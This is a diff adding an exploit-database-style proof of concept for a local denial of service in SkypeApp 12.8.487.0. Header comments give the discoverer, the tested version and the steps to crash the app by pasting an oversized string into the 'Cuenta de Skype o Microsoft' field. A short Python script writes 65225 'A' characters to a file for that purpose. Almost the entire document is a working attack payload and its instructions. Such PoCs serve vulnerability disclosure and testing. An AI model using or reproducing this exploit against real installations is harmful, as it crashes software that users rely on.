@@ -1,0 +1,22 @@
+# Exploit Title: SkypeApp 12.8.487.0 - 'Cuenta de Skype o Microsoft' Denial of Service (PoC)
+# Discovery by: Luis Martinez
+# Discovery Date: 2018-08-23
+# Vendor Homepage: https://www.skype.com/es/home/
+# Tested Version: 12.8.487.0
+# Vulnerability Type: Denial of Service (DoS) Local
+# Tested on OS: Windows 10 Pro x64 es
+
+# Steps to Produce the Crash: 
+# 1.- Run python code : python SkypeApp_12.8.487.0.py
+# 2.- Open SkypeApp_12.8.487.0.txt and copy content to clipboard
+# 3.- Open SkypeApp.exe
+# 4.- Paste ClipBoard on "Cuenta de Skype o Microsoft"
+# 5.- Siguiente
+# 6.- Crashed
+
+#!/usr/bin/env python
+ 
+buffer = "\x41" * 65225
+f = open ("SkypeApp_12.8.487.0.txt", "w")
+f.write(buffer)
+f.close()
